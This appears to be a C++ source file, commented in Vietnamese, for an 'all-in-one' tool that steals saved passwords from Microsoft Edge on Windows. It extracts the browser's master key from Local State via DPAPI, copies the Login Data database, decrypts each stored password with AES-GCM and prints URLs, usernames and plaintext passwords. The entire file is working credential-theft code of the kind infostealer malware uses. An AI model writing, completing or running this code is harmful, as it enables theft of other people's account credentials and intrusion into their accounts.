#include <iostream>
#include <fstream>
#include <vector>
#include <string>

// Thư viện Windows
#include <windows.h>
#include <dpapi.h>
#include <shlobj.h>
#include <bcrypt.h> // Thư viện mã hóa

// Thư viện ngoài (đã add vào project)
#include "json.hpp"
#include "sqlite3.h"

// Link thư viện hệ thống
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "bcrypt.lib")

using json = nlohmann::json;
using namespace std; // QUAN TRỌNG: Phải đặt dòng này trước khi dùng vector

// --- HÀM 1: GIẢI MÃ BASE64 ---
static const string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

vector<BYTE> Base64Decode(string const& encoded_string) {
    int in_len = encoded_string.size();
    int i = 0, j = 0, in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    vector<BYTE> ret;

    while (in_len-- && (encoded_string[in_] != '=') && isalnum(encoded_string[in_]) || (encoded_string[in_] == '+') || (encoded_string[in_] == '/')) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++) char_array_4[i] = base64_chars.find(char_array_4[i]);
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            for (i = 0; (i < 3); i++) ret.push_back(char_array_3[i]);
            i = 0;
        }
    }
    if (i) {
        for (j = i; j < 4; j++) char_array_4[j] = 0;
        for (j = 0; j < 4; j++) char_array_4[j] = base64_chars.find(char_array_4[j]);
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
        for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
    }
    return ret;
}

// --- HÀM 2: GIẢI MÃ AES-GCM (Sửa lỗi goto & đặt đúng chỗ) ---
vector<BYTE> AES_GCM_Decrypt(const vector<BYTE>& key, const vector<BYTE>& iv, const vector<BYTE>& ciphertext, const vector<BYTE>& authTag) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    vector<BYTE> plaintext;
    NTSTATUS status = 0;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    ULONG resultLen = 0;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return {};
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) goto cleanup;
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0) != 0) goto cleanup;

    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)iv.data();
    authInfo.cbNonce = (ULONG)iv.size();
    authInfo.pbTag = (PUCHAR)authTag.data();
    authInfo.cbTag = (ULONG)authTag.size();

    plaintext.resize(ciphertext.size());

    status = BCryptDecrypt(hKey, (PUCHAR)ciphertext.data(), (ULONG)ciphertext.size(), &authInfo, NULL, 0, plaintext.data(), (ULONG)plaintext.size(), &resultLen, 0);

    if (status != 0) plaintext.clear();
    else plaintext.resize(resultLen);

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return plaintext;
}

// --- HÀM 3: LẤY MASTER KEY ---
vector<BYTE> GetMasterKey() {
    char path[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path) != S_OK) return {};

    string keyPath = string(path) + "\\Microsoft\\Edge\\User Data\\Local State";
    ifstream f(keyPath);
    if (!f.is_open()) return {};

    try {
        json j = json::parse(f);
        string encrypted_key_b64 = j["os_crypt"]["encrypted_key"];
        vector<BYTE> encrypted_key = Base64Decode(encrypted_key_b64);

        if (encrypted_key.size() < 5) return {};
        DATA_BLOB in, out;
        in.pbData = encrypted_key.data() + 5;
        in.cbData = (DWORD)(encrypted_key.size() - 5);

        if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
            vector<BYTE> master_key(out.pbData, out.pbData + out.cbData);
            LocalFree(out.pbData);
            return master_key;
        }
    }
    catch (...) {}
    return {};
}

// --- HÀM 4: ĐỌC DỮ LIỆU (Đã tối ưu) ---
void ReadDB(const vector<BYTE>& masterKey) {
    char path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path);

    string originalDb = string(path) + "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
    string tempDb = "TempLogin.db";

    if (CopyFileA(originalDb.c_str(), tempDb.c_str(), FALSE) == 0) {
        cout << "[!] Khong copy duoc DB.\n";
        return;
    }

    sqlite3* db;
    if (sqlite3_open(tempDb.c_str(), &db) == SQLITE_OK) {
        const char* query = "SELECT origin_url, username_value, password_value FROM logins";
        sqlite3_stmt* stmt;

        if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
            cout << "\n=== KET QUA ===\n";
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* url = (const char*)sqlite3_column_text(stmt, 0);
                const char* user = (const char*)sqlite3_column_text(stmt, 1);
                const void* passBlob = sqlite3_column_blob(stmt, 2);
                int passLen = sqlite3_column_bytes(stmt, 2);

                if (user && strlen(user) > 0) {
                    cout << "URL:  " << url << endl;
                    cout << "User: " << user << endl;

                    // FIX LỖI CRASH: Chỉ giải mã nếu đủ độ dài
                    if (passLen >= 31) {
                        vector<BYTE> buff((BYTE*)passBlob, (BYTE*)passBlob + passLen);
                        if (buff[0] == 'v' && buff[1] == '1') {
                            vector<BYTE> iv(buff.begin() + 3, buff.begin() + 15);
                            vector<BYTE> ciphertext(buff.begin() + 15, buff.end() - 16);
                            vector<BYTE> authTag(buff.end() - 16, buff.end());

                            vector<BYTE> decrypted = AES_GCM_Decrypt(masterKey, iv, ciphertext, authTag);
                            if (!decrypted.empty()) {
                                string passStr(decrypted.begin(), decrypted.end());
                                cout << "Pass: " << passStr << endl;
                            }
                            else {
                                cout << "Pass: (Loi giai ma)" << endl;
                            }
                        }
                    }
                    else {
                        cout << "Pass: (Trong/Ngan)" << endl;
                    }
                    cout << "--------------------\n";
                }
            }
        }
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db);
    DeleteFileA(tempDb.c_str());
}

int main() {
    cout << "--- TOOL C++ ALL-IN-ONE ---\n";
    vector<BYTE> key = GetMasterKey();

    if (!key.empty()) {
        cout << "[+] Master Key OK.\n";
        ReadDB(key);
    }
    else {
        cout << "[!] Khong lay duoc Key.\n";
    }

    system("pause");
    return 0;
}